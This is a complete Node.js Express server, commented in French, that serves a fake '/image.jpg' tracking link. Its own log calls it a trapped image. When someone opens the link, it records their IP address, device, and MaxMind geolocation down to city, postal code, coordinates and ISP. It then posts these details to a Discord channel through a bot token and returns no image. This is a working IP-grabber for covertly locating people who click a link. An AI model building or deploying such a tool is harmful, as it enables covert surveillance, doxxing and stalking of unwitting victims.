const express = require('express');
const cors = require('cors');
const maxmind = require('maxmind');
const axios = require('axios');
const DeviceDetector = require('device-detector-js');
const fs = require('fs');
require('dotenv').config(); // Charge les variables d'environnement

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
const deviceDetector = new DeviceDetector();

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CLIENTS_FILE = './clients.json';

let lookup;
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();

app.get('/image.jpg', async (req, res) => {
  const queryId = req.query.u;
  if (!queryId) return res.status(400).send("Lien invalide");

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  let log = `📸 **Image piégée ouverte !**\n`;
  log += `IP : ${ip}\n`;
  log += `Appareil : ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}\n`;

  try {
    const geo = lookup.get(ip);
    const loc = geo?.location;

    log += `🌍 Localisation MaxMind :\n`;
    log += `• Pays : ${geo?.country?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Région : ${geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Ville : ${geo?.city?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Code postal : ${geo?.postal?.code || '❌ Introuvable'}\n`;
    log += `• Coordonnées : ${loc?.latitude || '?'} , ${loc?.longitude || '?'}\n`;
    log += `• FAI : ${geo?.traits?.isp || '❌ Introuvable'}\n`;

    const proxyFlags = [];
    if (geo?.traits?.is_anonymous_proxy) proxyFlags.push("🔒 Proxy anonyme");
    if (geo?.traits?.is_satellite_provider) proxyFlags.push("🛰️ Satellite");
    if (geo?.traits?.is_legitimate_proxy) proxyFlags.push("🧪 Proxy déclaré");

    if (proxyFlags.length > 0) {
      log += `⚠️ Réseau suspect :\n- ${proxyFlags.join('\n- ')}\n`;
    } else {
      log += `✅ Connexion légitime\n`;
    }
  } catch (err) {
    log += `❌ Erreur de géolocalisation : ${err.message}`;
  }

  console.log(log);

  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[queryId];

      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          content: log
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      } else {
        console.log("❌ Aucun salon trouvé pour ce lien");
      }
    }
  } catch (err) {
    console.log("❌ Erreur Discord log :", err.message);
  }

  res.status(204).send(); // pas d'image envoyée, juste déclenchement
});

app.listen(port, () => {
  console.log(`🛰️ Serveur actif sur le port ${port}`);
});
